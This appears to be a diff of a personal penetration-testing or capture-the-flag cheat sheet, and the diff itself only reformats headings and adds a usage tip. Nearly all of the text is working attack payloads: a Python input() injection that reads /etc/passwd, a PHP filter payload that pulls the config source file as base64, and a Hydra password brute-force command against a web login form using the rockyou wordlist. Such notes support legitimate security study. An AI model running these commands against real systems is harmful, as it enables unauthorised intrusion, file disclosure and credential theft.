@@ -5,10 +5,10 @@ exploiting input() command:
 __import__("os").system('cat /etc/passwd')
 
 
-PHP:
+##  PHP:
 fetching source files : 
 index.php?file=php://filter/convert.base64-encode/resource=config 
 
-Hydra:
+## Hydra:
 hydra -s 45885 -l admin www.bruteforce.me -P rockyou.txt http-form-post "/:password=^PASS^:F=Invalid"
-
+follow the format ' path : inputs : F=failure condition"   , -s specifies port , even if u send pass only, specify user for it to run smoothly
